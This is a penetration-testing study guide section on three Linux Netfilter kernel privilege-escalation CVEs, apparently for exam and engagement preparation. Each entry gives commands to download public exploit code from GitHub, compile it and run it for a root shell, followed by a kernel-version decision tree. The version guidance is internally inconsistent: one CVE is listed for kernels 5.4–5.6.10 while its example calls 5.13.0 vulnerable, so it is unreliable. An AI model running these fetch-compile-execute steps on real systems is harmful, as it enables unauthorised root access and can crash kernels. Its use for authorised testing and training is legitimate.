# Section 26 — Netfilter Kernel Exploits

> No lab for this section — theory and exploit reference only.

---

## Concept

**Netfilter** is the Linux kernel's packet filtering framework — it powers `iptables`, `nftables`, `arptables`, NAT, and connection tracking. Because it runs in kernel space and processes every network packet, vulnerabilities in Netfilter code give direct kernel-level code execution → instant root.

Three major Netfilter privesc CVEs:

| CVE | Year | Affected Kernels | Component | Type |
|-----|------|-----------------|-----------|------|
| **CVE-2021-22555** | 2021 | 2.6 – 5.11 | `xt_compat` (iptables compat layer) | Heap OOB write |
| **CVE-2022-25636** | 2022 | 5.4 – 5.6.10 | `nf_dup_netdev.c` | Heap OOB write |
| **CVE-2023-32233** | 2023 | up to 6.3.1 | `nf_tables` anonymous sets | Use-After-Free |

---

## CVE-2021-22555 — iptables compat OOB write

**Kernels:** 2.6 – 5.11

The compat layer for 32-bit iptables on 64-bit kernels has a heap out-of-bounds write in `xt_compat_target_from_user()`. Exploits the memset size miscalculation to corrupt adjacent heap objects.

```bash
uname -r
# 5.10.5-051005-generic                   ← vulnerable (< 5.11)

# Download and compile (needs -m32 and static linking)
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
# uid=0(root)
```
> Requires `gcc-multilib` for `-m32` flag. If not available, cross-compile on attacker box with matching GLIBC. The exploit is from Google's security research team — well-tested and reliable.

---

## CVE-2022-25636 — nf_dup_netdev heap OOB write

**Kernels:** 5.4 – 5.6.10

Heap out-of-bounds write in `net/netfilter/nf_dup_netdev.c`. Exploits incorrect array indexing when duplicating network device references.

```bash
uname -r
# 5.13.0-051300-generic                   ← vulnerable

git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
# uid=0(root)
```
> **Warning:** This exploit can corrupt the kernel and crash the system. May require a reboot if it fails. On an engagement, only use as a last resort — on an exam, save your progress first.

---

## CVE-2023-32233 — nf_tables Use-After-Free

**Kernels:** up to 6.3.1

Use-After-Free in `nf_tables` anonymous sets. Anonymous sets are temporary workspaces for batch request processing — they should be freed after use, but a bug allows continued access to freed memory. The exploit manipulates this to overwrite `modprobe_path` in kernel memory.

```bash
uname -r
# anything up to 6.3.1                   ← vulnerable

git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
# uid=0(root)
```
> Requires `libmnl-dev` and `libnftnl-dev` libraries for compilation. If not installed on target, cross-compile or install: `apt install libmnl-dev libnftnl-dev`.

---

## Quick Decision Tree

```
uname -r →
├── 2.6 – 5.11    →  CVE-2021-22555 (iptables compat, needs gcc -m32 -static)
├── 5.4 – 5.6.10  →  CVE-2022-25636 (nf_dup_netdev, WARNING: can crash kernel)
├── up to 6.3.1   →  CVE-2023-32233 (nf_tables UAF, needs libmnl + libnftnl)
├── 5.8 – 5.16    →  Also try: CVE-2022-0847 Dirty Pipe (§25)
└── Any with polkit →  Also try: CVE-2021-4034 PwnKit (§24)
```

---

## Exam / Engagement Notes

- **Netfilter exploits are a fallback** — try PwnKit (§24), Dirty Pipe (§25), sudo vulns (§23), and kernel exploits like OverlayFS (§19) first. Netfilter exploits are less reliable and can crash the system.
- **CVE-2022-25636 can corrupt the kernel** — if it fails, the box may need a reboot. On an exam, save your work. On a real engagement, coordinate with the client.
- **CVE-2023-32233 covers the widest range** — kernels up to 6.3.1 (June 2023). Most modern unpatched systems fall in this range.
- **Compilation dependencies matter**: CVE-2021-22555 needs `gcc-multilib` for `-m32`; CVE-2023-32233 needs `libmnl-dev` and `libnftnl-dev`. If these aren't on target, compile on Kali with matching GLIBC.
- **All three are heap corruption exploits** — inherently less stable than Dirty Pipe or PwnKit. May need multiple attempts.
- **Why old kernels persist**: companies run legacy distros because upgrading breaks their software stack. Containers and VMs still use the host kernel, so a vulnerable host kernel = vulnerable containers.

---

## All Netfilter CVEs at a Glance

| CVE | Kernel Range | Compile Flags | Stability | Notes |
|-----|-------------|---------------|-----------|-------|
| CVE-2021-22555 | 2.6 – 5.11 | `gcc -m32 -static` | Moderate | Google PoC, well-tested |
| CVE-2022-25636 | 5.4 – 5.6.10 | `make` | **Low — can crash** | Last resort only |
| CVE-2023-32233 | ≤ 6.3.1 | `gcc -lmnl -lnftnl` | Moderate | Widest kernel range |

> One line: Netfilter runs in kernel space → heap corruption bugs in iptables/nftables code → overwrite kernel memory → root. Three CVEs covering 2021–2023, all require compilation on target.
